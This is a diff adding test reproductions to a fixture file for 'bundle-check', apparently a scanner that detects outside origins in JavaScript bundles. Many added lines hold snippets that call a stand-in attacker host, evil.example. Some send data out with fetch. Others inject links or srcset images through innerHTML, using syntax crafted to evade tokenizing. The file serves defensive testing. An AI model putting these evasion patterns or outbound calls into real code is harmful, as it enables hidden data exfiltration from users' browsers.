@@ -1,7 +1,8 @@
 # Every reproduction from bundle-check's review rounds (pull request #20 and the rounds after it),
 # one block per finding, read by bundle-check.findings.test.mjs: each block is one test, named
 # after its finding, and each line one reproduction with the outcome its finding and the steward's
-# ruling give it. The texts are the findings' own, as written.
+# ruling give it. The texts are the findings' own, as written; where a finding names a shape but
+# gives no text for it (BC1.2 to BC1.5's forms), the fix's own text of that shape.
 #
 #   == <id> | <class> | <the finding's title>
 #   > <the ruling or the reason for an outcome, shown when a reproduction fails>
@@ -1146,3 +1147,43 @@
 == C2x.6 | A | A tag whose name comes from a concatenation is never opened: ``e.innerHTML=`<`+t+` href=//evil.example/x>go`;`` passes at every head; rolldown prints exactly this shape from '<' + tag + ...
 + assets/a.js https://evil.example | e.innerHTML=`<`+t+` href=//evil.example/x>go`;
 + assets/a.js https://evil.example | e.innerHTML="<"+t+" href=//evil.example/x>go";
+
+== BC1.2 | A | The tokenizer misreads valid JavaScript after a class whose heritage holds a call: an outside origin passes unread, and honest code is refused
++ assets/a.js https://evil.example | class Rows extends Base(Object){*cells(r){for(const s of r)yield /'/.test(s)?esc(s):s}send(u){return fetch('https://evil.example/x',{body:u})}strip(s){return s.replace(/'/g,'')⟨NL⟩}}
++ assets/a.js https://evil.example | class A extends function(){}{*g(r){yield /'/.test(r)}send(u){return fetch('https://evil.example/x',{body:u})}strip(s){return s.replace(/'/g,'')⟨NL⟩}}
++ assets/a.js https://evil.example | class A extends {}.constructor{*g(r){yield /'/.test(r)}send(u){return fetch('https://evil.example/x',{body:u})}strip(s){return s.replace(/'/g,'')⟨NL⟩}}
+- assets/a.js | class A extends f(B){*g(){yield/'/.test(a)?1:2}}
+- assets/a.js | class A extends f(B){async m(){if(await/'/.test(a))return 1}}
+
+== BC1.3 | A | The tokenizer reads TypeScript's `type`, `as` and `satisfies` in a .js file where JavaScript has a name: `type in /re/` and `async as=>await /re/` put the rest of the script out of step
++ assets/a.js https://evil.example | var type=0;type in /'/&&0;fetch('https://evil.example/x')
++ assets/a.js https://evil.example | const g=async as=>await /'/.test(as)?0:fetch('https://evil.example/x')
++ assets/a.js https://evil.example | const g=async satisfies=>await /'/.test(satisfies)?0:fetch('https://evil.example/x')
++ assets/a.js https://evil.example | const g=async let=>await /'/.test(let)?0:fetch('https://evil.example/x')
+- assets/a.js | var type=0;type in /'/&&0;
+- assets/a.js | const g=async as=>{if(await/'/.test(as))return 1};
+
+== BC1.4 | A | The ruled `+=` join is read narrower than ruled: a tag goes on past a statement's end only when the literal stands right after `+=`
++ assets/a.js https://evil.example | let n='<a ';n+=t+' href=//evil.example/x>go</a>';e.innerHTML=n;
++ assets/a.js https://evil.example | h='<img ';h+=a>b?'x':'y';h+=w+' src=//evil.example/p.png>';
++ assets/a.js https://evil.example | let h='<a ';h+=c+' href=//evil.example/x>go</a>';
++ assets/a.js https://evil.example | let h='<a ';h+=d+' href=//evil.example/x>go</a>';
++ assets/a.js https://evil.example | let n='<a ';n+=r+' href=//evil.example/x>go</a>';
++ assets/a.js https://evil.example | let t='<a ';t+=g(e)+' href=//evil.example/x>go</a>';
++ assets/a.js https://evil.example | let h='<a ';h+=(c?'class=x ':'')+' href=//evil.example/x>go</a>';
+
+== BC1.5 | A | A tag whose first piece is held in a variable and joined with `+` in a later statement is no longer followed: 1,084 rewritten class-A reproductions pass
++ assets/a.js https://evil.example | const n='<a '+t;e.innerHTML=n+' href=//evil.example/x>go</a>';
++ assets/a.js https://evil.example | function f(t){const n='<a '+t;if(t)return n+' href=//evil.example/x>go</a>';return n+'>'}
++ assets/a.js https://evil.example | let h='<img ';h=h+' src=//evil.example/x>';e.innerHTML=h;
++ assets/a.js https://evil.example | const n='<a '+t;e.innerHTML=n.concat(' href=//evil.example/x>go</a>');
++ assets/a.js https://evil.example | const n='<a '+t;e.innerHTML=n.concat(t,' href=//evil.example/x>go</a>');
++ assets/a.js https://evil.example | const n='<a '+t;e.innerHTML=`${n} href=//evil.example/x>go</a>`;
++ assets/a.js https://evil.example | const n='<a '+t;e.innerHTML=`${n}${' href=//evil.example/x'}>go</a>`;
+
+== BC1.6 | A | A srcset key given as a later argument is no key: `attr(e,'srcset',...)`, `setAttribute(e,'srcset',...)` and `setAttributeNS(null,'srcset',...)` are read by shape only
++ assets/a.js https://evil.example | attr(e,'srcset','/hero(1).png, //evil.example/b.png 2x')
++ assets/a.js https://evil.example | setAttribute(e,'srcset','/a.png;v=2, //evil.example/b.png 2x')
++ assets/a.js https://evil.example | i.setAttributeNS(null,'srcset','/a.png foo, //evil.example/b.png')
+- assets/a.js | console.warn("Invalid srcset:",e);return n.push(e),/\//.test(e)?"a":"b"
+- assets/a.js | console.warn(e,"bad srcset:",v);const P={http:80,https:443};
